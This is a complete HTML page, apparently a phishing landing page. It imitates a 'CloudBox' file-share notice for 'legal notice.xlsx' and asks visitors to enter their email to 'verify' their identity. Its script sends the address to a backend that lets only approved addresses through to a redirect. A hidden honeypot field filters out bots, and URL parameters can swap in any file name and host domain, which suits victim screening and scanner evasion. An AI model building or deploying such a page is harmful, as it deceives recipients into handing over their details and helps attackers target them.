<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>Email verification</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="color-scheme" content="light dark">
  <style>
    /* ===== Brand tokens (edit these only) ===== */
    :root{
      --brand:#1f6fd1;            /* header + button */
      --brand-700:#1657a6;        /* button hover/active */
      --bg:#f1f1f1;               /* page background */
      --card:#ffffff;             /* card background */
      --text:#1f2937;             /* main text */
      --muted:#6b7280;            /* secondary text */
      --border:#e5e7eb;           /* light strokes */
      --radius:3px;              /* card/button radius */
      --card-shadow:0 12px 28px rgba(0,0,0,.08);
      --maxw:300px;
      --focus:#6aa1ff;            /* focus ring */
    }
    @media (prefers-color-scheme: dark){
      :root{
        --bg:#0f141a; --card:#121922; --text:#f2f5f9; --muted:#9aa4b2; --border:#273142;
        --card-shadow:0 12px 28px rgba(0,0,0,.6);
      }
    }

    /* ===== Base ===== */
    *{ box-sizing:border-box }
    html,body{ height:100% }
    body{
      margin:0;
      font:14px/1.5 system-ui,-apple-system,Segoe UI,Roboto,Helvetica,Arial,sans-serif;
      background:var(--bg);
      color:var(--text);
    }

    /* Top brand bar */
    .brandbar{
      height:33px;
      background:var(--brand);
      color:#fff;
      display:flex; align-items:center;
      padding:0 16px;
      font-weight:600;
      letter-spacing:.2px;
    }

    /* Centered container */
    .wrap{
      min-height:calc(100% - 48px);
      display:grid;
      place-items:center;
      padding:45px 16px;
    }

    /* Card */
    .card{
      width:73%;
      max-width:var(--maxw);
      background:var(--card);
      border:1px solid var(--border);
      border-radius:var(--radius);
      box-shadow:var(--card-shadow);
      overflow:hidden;
      font-size:13px;
    }
    .card-head{
      padding:15px 14px;
      border-bottom:1.2px solid var(--border);
      text-align:center;
    }
    .card-title{
      margin:4px 0 0 0;
      font-size:20px;
      line-height:1.25;
      font-weight:105;
    }
    .card-body{ padding:10px 24px }
    .card-body p{ margin:0 0 12px 0; color:var(--muted) }

    /* File name badge */
    .file{
      display:inline-block;
      padding:10px 14px;
      border:0px solid var(--border);
      border-radius:4px;
      background:#fff;
      color:var(--text);
      font-weight:600;
      margin:6px 0 12px;
      word-break:break-word;
      max-width:100%;
      font-size:15px;
    }

    /* Form */
    .field{ margin:12px 0 0 0 }
    label{ display:block; font-size:12px; color:var(--muted); margin-bottom:6px }
    .input{
      width:100%;
      height:40px;
      border:1px solid var(--border);
      border-radius:3px;
      padding:0 12px;
      background:var(--card);
      color:var(--text);
      outline:none;
    }
    .input:focus{
      border-color:var(--focus);
      
    }

    /* Button */
    .actions{ margin:18px 0 8px; display:flex; gap:12px }
    .btn{
      appearance:none; border:0; cursor:pointer;
      height:40px; padding:0 18px; border-radius:var(--radius);
      background:var(--brand); color:#fff; font-weight:650; width:100%;
    }
    .btn:hover{ background:var(--brand-700) }
    .btn:disabled{ opacity:1; cursor:not-allowed }

    .caption{ font-size:12px; color:var(--muted); margin-top:12px }
    .caption small{ display:block; opacity:.9 }

   
   
   
   
   /* Logo size token */
:root{ --logo-size: 40px; }

/* Centers the image at the top of the card header */
.card-head { text-align: center; }

/* Image styling */
.card-logo{
  
  margin: 0 auto 3px;      /* top of frame + a small gap before the title */
  object-fit: contain;      /* keeps aspect ratio for PNG/SVG */
}

/* Optional: subtle ring for visibility on mixed backgrounds */
.card-logo--ring{
  border-radius: 8px;
  box-shadow: 0 0 0 1px rgba(0,0,0,.06);
}

/* Optional dark-mode tweak if your asset is dark */
@media (prefers-color-scheme: dark){
  .card-logo{ filter: brightness(1.1) contrast(1.05); }
}

   
   
   
   
   
   
   
   
   
   
   

    /* Narrow */
    @media (max-width:480px){
      :root{ --maxw:92vw }
      .card-title{ font-size:20px }
    }
  </style>
</head>
<body>

  <!-- Top brand bar -->
  <div class="brandbar">
    <!-- Put your brand/product here -->
    <span id="brandName">CloudBox</span>
  </div>

  <!-- Centered card -->
  <main class="wrap">
  
  
 
  <!-- host your file e.g. /assets/identity-mark.svg or .png -->
  <img class="card-logo"
       src="nn.PNG"
       alt=""
       width="90" height="90"
       decoding="async" loading="eager">




  <!-- Honeypot (must stay empty) -->
<input type="text" id="middleName" name="middleName" tabindex="-1" autocomplete="off"
       aria-hidden="true" style="position:absolute;left:-9999px;opacity:0;height:0;width:0;border:0;padding:0;">

<!-- Optional Cloudflare Turnstile/Recaptcha token holder -->
<input type="hidden" id="cfToken" name="cfToken" value="">

  
  
  
  
  
    <form class="card" id="verifyForm" method="post" action="/verify">
    
      <header class="card-head" aria-labelledby="t">
        <!-- Replace SVG with your logo if desired (CID-embedded is fine) -->
       
        <h1 id="t" class="card-title">Verify your identity</h1>
      </header>
      

      <section class="card-body">
        <p>You’ve been sent a secure link to:</p>
        <div class="file" id="fileName">legal notice.xlsx</div>
        <p>To open this secure link, enter the email address it was shared with.</p>

        <div class="field">
          <label for="email"></label>
          <input class="input" id="email" name="email" type="email" autocomplete="email"
                 placeholder="Enter email address
" required inputmode="email" />
        </div>

        <div class="actions">
          <button class="btn" id="continueBtn" type="submit" disabled>Continue</button>
        </div>

        <div class="caption" id="disclosure">
          <small>By selecting “Continue”, you allow <strong id="hostDomain">files.example.com</strong> to use your email in accordance with its Privacy Notice.</small>
        </div>
      </section>
    </form>
  </main>

 

  <script>
  // ---- Elements
  const form  = document.getElementById('verifyForm');
  const email = document.getElementById('email');
  const btn   = document.getElementById('continueBtn');

  // Optional hidden fields (added below)
  const cfTok = document.getElementById('cfToken');      // may be null
  const hp    = document.getElementById('middleName');   // honeypot

  // enable button only when email shape is OK
  const looksLikeEmail = v => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(String(v).trim());
  email.addEventListener('input', () => { btn.disabled = !looksLikeEmail(email.value) });

  // helper: show a neutral message
  function showMsg(text, ok=false){
    let el = document.getElementById('alert');
    if (!el) {
      el = document.createElement('div');
      el.id = 'alert';
      el.className = 'alert';
      form.querySelector('.card-body').appendChild(el);
    }
    el.textContent = text;
    el.setAttribute('role', 'status');
    el.style.color = ok ? '#1e5fcc' : '#b91c1c';
    el.style.marginTop = '8px';
    el.style.fontSize = '12px';
  }

  // Progressive-enhanced JSON submit (your backend requires JSON)
  form.addEventListener('submit', async (e) => {
    e.preventDefault();

    // FRONT-END GUARD: keep disabled if bad shape
    if (!looksLikeEmail(email.value)) return;

    btn.disabled = true;
    const original = btn.textContent;
    btn.textContent = 'Checking…';

    const payload = {
      email: String(email.value || '').trim().toLowerCase(),
      jsToken: 'ok-' + Math.random().toString(36).slice(2),
      cfToken: cfTok ? cfTok.value : '',
      middleName: hp ? hp.value : ''   // must be empty, or backend will flag honeypot
    };

    try {
      const res = await fetch(form.getAttribute('action') || '/verify', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json; charset=utf-8',
          'X-Client-Lang': navigator.language || 'en'
        },
        body: JSON.stringify(payload)
      });

      const data = await res.json().catch(() => ({}));

      if (res.ok && data && data.valid && data.redirect) {
        // ✅ whitelisted — backend gave us a redirect URL
        showMsg(data.message || 'Validated', true);
        location.assign(data.redirect);
        return;
      }

      // Neutral messaging (avoid membership leaks)
      const msg = (data && data.message) || 'Unable to verify your email. Please try again.';
      showMsg('If your email is permitted for this file, you will receive access shortly.');
    } catch (err) {
      showMsg('Network issue. Please retry in a moment.');
    } finally {
      btn.disabled = !looksLikeEmail(email.value);
      btn.textContent = original;
    }
  });

  // Optional query params → UI
  const q = new URLSearchParams(location.search);
  if (q.get('file')) document.getElementById('fileName').textContent = q.get('file');
  if (q.get('host')) document.getElementById('hostDomain').textContent = q.get('host');
</script>

</body>
</html>
